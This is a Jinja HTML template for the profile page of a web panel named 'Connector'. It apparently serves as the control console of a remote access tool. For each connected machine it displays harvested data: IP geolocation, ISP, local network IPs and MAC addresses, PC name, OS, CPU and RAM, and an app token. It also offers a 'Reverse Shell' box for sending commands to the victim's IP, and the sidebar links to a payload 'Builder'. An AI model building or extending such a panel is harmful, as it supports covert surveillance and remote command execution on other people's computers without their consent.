<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/codemirror@5.61.0/lib/codemirror.min.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200"/>
    <script src="https://cdn.jsdelivr.net/npm/codemirror@5.61.0/mode/python/python.min.js"></script>
    
    <title>Viewing Profile #{{ user.id }}</title>
</head>

<style>
.side-menu .brand-name,.title{align-items:center;display:flex}.side-menu,body{min-height:100vh}.btn,a,a:visited{color:#fff}.container .content .content-2 .admin-table table td:first-child img,.container .header .nav .user img{height:40px;width:40px}*,.tabs ul li{box-sizing:border-box}.badge,.btn,.tabs ul li{text-align:center}input,table{padding:10px}*{margin:0;padding:0;font-family:Poppins,sans-serif}a,a.badge:focus,a.badge:hover{text-decoration:none}li{list-style:none}h1,h2{color:#444}h3{color:#999}.btn{background:{{ theme }};padding:5px 10px;border-radius:4px}.btn:hover{color:{{ theme }};background:#fff;padding:3px 8px;border:2px solid {{ theme }}}.title{justify-content:space-around;padding:15px 10px;border-bottom:2px solid #999}td,th{text-align:left;padding:8px}.side-menu{position:fixed;background:{{ theme }};width:20vw;display:flex;flex-direction:column}.side-menu .brand-name{height:10vh;justify-content:center}.side-menu li{font-size:28px;padding:10px 40px;color:#fff;display:flex;align-items:center}.side-menu li:hover{background:rgba(39, 37, 37, 0.439);color:{{ theme }}}.container{position:absolute;right:0;width:80vw;height:100vh;background:#f1f1f1}.container .header{position:fixed;top:0;right:0;width:80vw;height:10vh;background:#fff;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 8px 0 rgba(0,0,0,.2);z-index:1}.container .header .nav{width:90%;display:flex;align-items:center}.container .header .nav .search{flex:3;display:flex;justify-content:center}.container .header .nav .search input[type=text]{border:none;background:#f1f1f1;padding:10px;width:50%}.container .header .nav .search button{width:40px;height:40px;border:none;display:flex;align-items:center;justify-content:center}.container .header .nav .search button img{width:30px;height:30px}.container .header .nav .user{flex:1;display:flex;justify-content:space-between;align-items:center}.container .header .nav .user .img-case{position:relative;width:50px;height:50px}.container .header .nav .user .img-case img{position:absolute;top:0;left:0;width:100%;height:100%}.container .content{position:relative;margin-top:10vh;min-height:90vh;background:#f1f1f1}.container .content .cards{padding:20px 15px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap}.container .content .cards .card{width:200px;height:120px;background:#fff;margin:20px 10px;display:flex;align-items:center;justify-content:space-around;box-shadow:0 4px 8px 0 rgba(0,0,0,.2),0 6px 20px 0 rgba(0,0,0,.19)}.container .content .content-2{min-height:60vh;display:flex;justify-content:space-around;align-items:flex-start;flex-wrap:wrap}.container .content .content-2 .recent-connections{min-height:55vh;flex:5;background:#fff;margin:0 25px 25px;box-shadow:0 4px 8px 0 rgba(0,0,0,.2),0 6px 20px 0 rgba(0,0,0,.19);display:flex;flex-direction:column}.container .content .content-2 .admin-table{flex:2;background:#fff;min-height:55vh;margin:0 25px;box-shadow:0 4px 8px 0 rgba(0,0,0,.335),0 6px 20px 0 rgba(0,0,0,.19);display:flex;flex-direction:column}@media screen and (max-width:1050px){.side-menu li{font-size:18px}}@media screen and (max-width:940px){.side-menu li span{display:none}.side-menu{align-items:center}.side-menu li img{width:40px;height:40px}.side-menu li:hover{background:{{ theme }};padding:8px 38px;border:2px solid #fff}}@media screen and (max-width:536px){.brand-name h1{font-size:16px}.container .content .cards{justify-content:center}.side-menu li img{width:30px;height:30px}.container .content .content-2 .recent-connections table td:nth-child(2),.container .content .content-2 .recent-connections table th:nth-child(2){display:none}}.tabs{position:relative;background:#fff;padding:50px 50px 80px;width:70%;box-shadow:0 14px 28px rgba(39, 37, 37, 0.439),0 10px 10px rgba(0,0,0,.22);border-radius:5px;min-width:240px}.badge:empty,.tabs input[name=tab-control],.tabs ul li label br{display:none}.tabs .tabcontent section h2,.tabs ul li label{font-family:Montserrat;font-weight:700;font-size:18px}.tabs ul{list-style-type:none;padding-left:0;display:flex;flex-direction:row;margin-bottom:10px;justify-content:space-between;align-items:flex-end;flex-wrap:wrap}.tabs ul li{flex:1;width:25%;padding:0 10px}.tabs ul li label{transition:.2s ease-in-out;color:#929daf;padding:5px auto;overflow:hidden;text-overflow:ellipsis;display:block;cursor:pointer;white-space:nowrap;-webkit-touch-callout:none}.tabs ul li label svg{fill:#929daf;height:1.2em;vertical-align:bottom;margin-right:.2em;transition:.2s ease-in-out}.tabs ul li label:active,.tabs ul li label:focus,.tabs ul li label:hover{outline:0;color:#bec5cf}.tabs ul li label:active svg,.tabs ul li label:focus svg,.tabs ul li label:hover svg{fill:#bec5cf}.tabs .slider{position:relative;width:25%;transition:.33s cubic-bezier(.38, .8, .32, 1.07)}.tabs .slider .indicator{position:relative;width:50px;max-width:100%;margin:0 auto;height:3px;background:{{ theme }};border-radius:1px}.tabs .tabcontent{margin-top:30px}.tabs .tabcontent section{display:none;animation-name:content;animation-direction:normal;animation-duration:.3s;animation-timing-function:ease-in-out;animation-iteration-count:1;line-height:1.4}.tabs .tabcontent section h2{color:{{ theme }};display:none}.tabs .tabcontent section h2::after{content:"";position:relative;display:block;width:30px;height:3px;background:{{ theme }};margin-top:5px;left:1px}.tabs input[name=tab-control]:first-of-type:checked~ul>li:first-child>label,.tabs input[name=tab-control]:nth-of-type(2):checked~ul>li:nth-child(2)>label,.tabs input[name=tab-control]:nth-of-type(3):checked~ul>li:nth-child(3)>label,.tabs input[name=tab-control]:nth-of-type(4):checked~ul>li:nth-child(4)>label{cursor:default;color:{{ theme }}}.tabs input[name=tab-control]:first-of-type:checked~ul>li:first-child>label svg,.tabs input[name=tab-control]:nth-of-type(2):checked~ul>li:nth-child(2)>label svg,.tabs input[name=tab-control]:nth-of-type(3):checked~ul>li:nth-child(3)>label svg,.tabs input[name=tab-control]:nth-of-type(4):checked~ul>li:nth-child(4)>label svg{fill:{{ theme }}}.tabs input[name=tab-control]:first-of-type:checked~.slider{transform:translateX(0)}.tabs input[name=tab-control]:first-of-type:checked~.tabcontent>section:first-child,.tabs input[name=tab-control]:nth-of-type(2):checked~.tabcontent>section:nth-child(2),.tabs input[name=tab-control]:nth-of-type(3):checked~.tabcontent>section:nth-child(3),.tabs input[name=tab-control]:nth-of-type(4):checked~.tabcontent>section:nth-child(4){display:block}.tabs input[name=tab-control]:nth-of-type(2):checked~.slider{transform:translateX(100%)}.tabs input[name=tab-control]:nth-of-type(3):checked~.slider{transform:translateX(200%)}.tabs input[name=tab-control]:nth-of-type(4):checked~.slider{transform:translateX(300%)}@keyframes content{from{opacity:0;transform:translateY(5%)}to{opacity:1;transform:translateY(0)}}@media (max-width:1000px){.tabs ul li label{white-space:initial}.tabs ul li label br{display:initial}.tabs ul li label svg{height:1.5em}}@media (max-width:600px){.tabs input[name=tab-control]:first-of-type:checked~ul>li:first-child>label,.tabs input[name=tab-control]:nth-of-type(2):checked~ul>li:nth-child(2)>label,.tabs input[name=tab-control]:nth-of-type(3):checked~ul>li:nth-child(3)>label,.tabs input[name=tab-control]:nth-of-type(4):checked~ul>li:nth-child(4)>label{background:rgba(0,0,0,.08)}.tabs ul li label{padding:5px;border-radius:5px}.tabs .slider,.tabs ul li label span{display:none}.tabs .tabcontent{margin-top:20px}.tabs .tabcontent section h2{display:block}}.form__group{position:relative;padding:15px 0 0;margin-top:10px;width:50%}.form__field{font-family:inherit;width:100%;border:0;border-bottom:2px solid #9b9b9b;outline:0;font-size:1rem;color:#444;padding:7px 0;background:0 0;transition:border-color .2s}.form__field::placeholder{color:transparent}.form__field:placeholder-shown~.form__label{font-size:1.1rem;cursor:text;top:20px}.form__field:focus~.form__label,.form__label{position:absolute;top:0;display:block;transition:.2s;font-size:1rem}.form__label{color:#9b9b9b}.form__field:focus{padding-bottom:6px;font-weight:700;border-width:3px;border-image:linear-gradient(to right,#ffd4d4,{{ theme }});border-image-slice:1}.form__field:focus~.form__label{color:{{ theme }};font-weight:700}.form__field:invalid,.form__field:required{box-shadow:none}.alert{padding:20px;background-color:#ff9800;color:#fff}.closebtn{margin-left:15px;color:#fff;font-weight:700;float:right;font-size:22px;line-height:20px;cursor:pointer;transition:.3s}.closebtn:hover{color:#000}.country,.side-menu img{max-width:20%;max-height:20%;padding-right:10px}.badge{display:inline-block;padding:.25em .4em;font-size:75%;font-weight:700;line-height:1;white-space:nowrap;vertical-align:baseline;border-radius:.25rem;transition:color .15s ease-in-out,background-color .15s ease-in-out,border-color .15s ease-in-out,box-shadow .15s ease-in-out}@media (prefers-reduced-motion:reduce){.badge{transition:none}}.btn .badge{position:relative;top:-1px}.badge-pill{padding-right:.6em;padding-left:.6em;border-radius:10rem}.badge-primary{color:#fff;background-color:#007bff}a.badge-primary:focus,a.badge-primary:hover{color:#fff;background-color:#0062cc}a.badge-primary.focus,a.badge-primary:focus{outline:0;box-shadow:0 0 0 .2rem rgba(0,123,255,.5)}.badge-secondary{color:#fff;background-color:#6c757d}a.badge-secondary:focus,a.badge-secondary:hover{color:#fff;background-color:#545b62}a.badge-secondary.focus,a.badge-secondary:focus{outline:0;box-shadow:0 0 0 .2rem rgba(108,117,125,.5)}.badge-success{color:#fff;background-color:#28a745}a.badge-success:focus,a.badge-success:hover{color:#fff;background-color:#1e7e34}a.badge-success.focus,a.badge-success:focus{outline:0;box-shadow:0 0 0 .2rem rgba(40,167,69,.5)}.badge-info{color:#fff;background-color:#17a2b8}a.badge-info:focus,a.badge-info:hover{color:#fff;background-color:#117a8b}a.badge-info.focus,a.badge-info:focus{outline:0;box-shadow:0 0 0 .2rem rgba(23,162,184,.5)}.badge-warning{color:#212529;background-color:#ffc107}a.badge-warning:focus,a.badge-warning:hover{color:#212529;background-color:#d39e00}a.badge-warning.focus,a.badge-warning:focus{outline:0;box-shadow:0 0 0 .2rem rgba(255,193,7,.5)}.badge-danger{color:#fff;background-color:{{ theme }}}a.badge-danger:focus,a.badge-danger:hover{color:#fff;background-color:#bd2130}a.badge-danger.focus,a.badge-danger:focus{outline:0;box-shadow:0 0 0 .2rem rgba(220,53,69,.5)}.badge-light{color:#212529;background-color:#f8f9fa}a.badge-light:focus,a.badge-light:hover{color:#212529;background-color:#dae0e5}#rainbow{background-color:red;animation:5s linear infinite bgColor}@keyframes bgColor{12.5%{background-color:red}25%{background-color:orange}37.5%{background-color:#37c723}50%{background-color:#0ef}62.5%{background-color:#139898}75%{background-color:#00f}87.5%{background-color:#9932cc}100%{background-color:#ff144b}}.material-symbols-outlined{width:45px;font-variation-settings:'FILL' 0,'wght' 400,'GRAD' 0,'opsz' 48}input{border:0;border-radius:4px;box-shadow:0 0 15px 4px rgba(0,0,0,.1)}
</style>

<body>

    <div class="side-menu">
        <div class="brand-name">
            <h1>Connector</h1>
        </div>
        <ul>
            <li><span class="material-symbols-outlined">dashboard</span>
                <a href="/dashboard">Dashboard</a></img></li>
            <li><span class="material-symbols-outlined">group</span>
                <a href="/users">Connections</a></img></li>
            <li><span class="material-symbols-outlined">build</span>
                <a href="/builder">Builder</a></li>
            <li><span class="material-symbols-outlined">api</span>
                <a href="/api">API</a></img></li>
            <li><span class="material-symbols-outlined">group</span>
                <a href="https://github.com/codeuk">Help</a></li>
            <li><span class="material-symbols-outlined">settings</span>
                <a href="/settings">Settings</a></li>
        </ul>
    </div>

    <div class="container">
        <div class="header">
            <div class="nav">
                <div class="user">
                    <a href="/api" class="btn">API</a>
                    <center>
                        <form action="{{ url_for('user_lookup') }}" method="post">
                            <div class="search">
                                <input type="text" name="uid" placeholder="Lookup User (ID)">
                                <input type="submit" value="ðŸ”Ž" class="btn">
                            </div>
                        </form>
                    </center>
                    <div class="img-case">
                        <img src="https://static.wixstatic.com/media/9b7898_d03aea77677444ccbf3b72500d7c14d1~mv2.png/v1/fill/w_291,h_291,al_c,q_85,usm_0.66_1.00_0.01,enc_auto/Profile-Male-PNG.png" alt="">
                    </div>
                </div>
            </div>
        </div>

        <div class="content">
            <div class="alert">
                <span class="closebtn" onclick="this.parentElement.style.display='none';">&times;</span> 
                <center><strong>Warning!</strong> This panel is still being worked on! Report any issues to github.com/codeuk</center>
            </div>
            <br><br><br>

            <div class="content-2">

                <div class="tabs">
                <input type="radio" id="tab1" name="tab-control" checked>
                <input type="radio" id="tab2" name="tab-control">
                <input type="radio" id="tab3" name="tab-control">  
                <input type="radio" id="tab4" name="tab-control">
                <ul>
                    <li title="User"><label for="tab1" role="button">
                        <br><span>User</span></label></li>

                    {% if user.admin == True %}
                        <li title="Network"><label for="tab2" role="button">
                            <br><s><span>Network</span></label></li></s>
                        <li title="System"><label for="tab3" role="button">
                            <br><s><span>System</span></label></s></li>
                    {% else %}
                        <li title="Network"><label for="tab2" role="button">
                            <br><span>Network</span></label></li>
                        <li title="System"><label for="tab3" role="button">
                            <br><span>System</span></label></li>
                    {% endif %}

                    <li title="Misc"><label for="tab4" role="button">
                        <br><span>Misc</span></label></li>
                </ul>

                <div class="slider"><div class="indicator"></div></div>
                <div class="tabcontent">
                    <section>
                        <h3>User Information</h3>
                        <div class="cards">
                            <div class="card">
                                <div class="box">
                                    <h1>Username</h1>
                                    <h3>{{ user.username }}</h3>
                                </div>
                            </div>
                            <div class="card">
                                <div class="box">
                                    <h1>Badges</h1>
                                    <center>
                                        {% if user.admin == True %}
                                            <span id="rainbow" class="badge badge-success">Admin</span>
                                        {% elif user.admin == False %}
                                            <span class="badge badge-primary">User</span>
                                        {% endif %}
                                        {% if user.bot == True %}
                                            <span class="badge badge-danger">Bot</span>
                                        {% endif %}
                                    </center>
                                </div>
                            </div>
                            <div class="card">
                                <div class="box">
                                    <h1>Country</h1>
                                    <h3>{{ user.location }}</h3>
                                </div>
                            </div>
                        </div>
                    </section>
                    <section>
                        {% if user.admin == False %}
                            <div class="admin-table">
                                <div class="title"><h1>IP Lookup Information</h1></div>
                                <table>
                                    <tr>
                                        <th>Key</th>
                                        <th>Value</th>
                                    </tr>
                                    {% for key, value in user.ipinfo.items() %}
                                    <tr>
                                        {% if key == "flag" %}
                                            <td>{{ key }}</td>
                                            <td><img src="{{ user.countryflag }}" style="width: 45px; height: 25px;"></img></td>
                                        {% elif key == "connection" %}
                                            <td>isp</td>
                                            <td>{{ value['org'] }}</td>
                                        {% elif key == "timezone" %}
                                            <td>{{ key }}</td>
                                            <td>{{ value['id'] }}</td>
                                        {% else %}
                                            <td>{{ key }}</td>
                                            <td>{{ value }}</td>
                                        {% endif %}
                                    </tr>
                                    {% endfor %}
                                </table>
                            </div>
                            <br>
                            <div class="admin-table">
                                <div class="title"><h1>Local Network</h1></div>
                                <table>
                                    <tr>
                                        <th>IP Address</th>
                                        <th>MAC Address</th>
                                        <th>Device Vendor</th>
                                    </tr>
                                    {% for i in range(user.localips| length) %}
                                    <tr>
                                        <td>{{ user.localips[i] }}</td>
                                        <td>{{ user.localmacs[i] }}</td>
                                        <td>{{ user.localorgs[i] }}</td>
                                    </tr>
                                    {% endfor %}
                                </table>
                            </div>

                        {% elif user.admin == True %}
                            <h3>Restricted - You cannot access an admins machine - </h3>
                        {% endif %}
                    </section>
                    
                    <section>
                        {% if user.admin == False %}
                        <div class="admin-table">
                            <div class="title"><h1>System Information</h1></div>
                            <table>
                                <tr>
                                    <th>Key</th>
                                    <th>Value</th>
                                </tr>

                                <tr>
                                    <td style="font-size:20px;">IP Address</td>
                                    <td style="font-size:20px;">{{ user.ip }}</td>
                                </tr>
                                <tr>
                                    <td style="font-size:20px;">PC Name</td>
                                    <td style="font-size:20px;">{{ user.pcname }}</td>
                                </tr>
                                <tr>
                                    <td style="font-size:20px;">System</td>
                                    <td style="font-size:20px;">{{ user.sysinfo[0] }}</td>
                                </tr>
                                <tr>
                                    <td style="font-size:20px;">Version</td>
                                    <td style="font-size:20px;">{{ user.sysinfo[1] }}</td>
                                </tr>
                                <tr>
                                    <td style="font-size:20px;">RAM</td>
                                    <td style="font-size:20px;">{{ user.ram }}GB</td>
                                </tr>
                                <tr>
                                    <td style="font-size:20px;">CPU</td>
                                    <td style="font-size:20px;">{{ user.sysinfo[2] }}</td>
                                </tr>
                                <tr>
                                    <td style="font-size:20px;">CPU Cores</td>
                                    <td style="font-size:20px;">{{ user.cores }}</td>
                                </tr>
                            </table>
                        </div><br>

                        <h3>Reverse Shell @ {{ user.ip }}:80</h3>
                        <div class="form__group field">
                            <input type="input" class="form__field" placeholder="Name" name="name" id='name' required/>
                            <label for="name" class="form__label">command to execute</label>
                        </div>

                        {% elif user.admin == True %}
                            <h3>Restricted - You cannot access an admins machine - </h3>
                        {% endif %}
                    </section>
                    <section>
                        <h3>Misc</h3>
                        <div class="cards">
                            <div class="card">
                                <div class="box">
                                    <h1>App Token</h1>
                                    <h3>{{ user.token }}</h3>
                                </div>
                            </div>
                            <div class="card">
                                <div class="box">
                                    <h1>Connected</h1>
                                    <h3>{{ user.added }}</h3>
                                </div>
                            </div>
                        </div>
                    </section>
                </div>
                </div>

            </div>
        </div>
    </div>
</body>

</html>
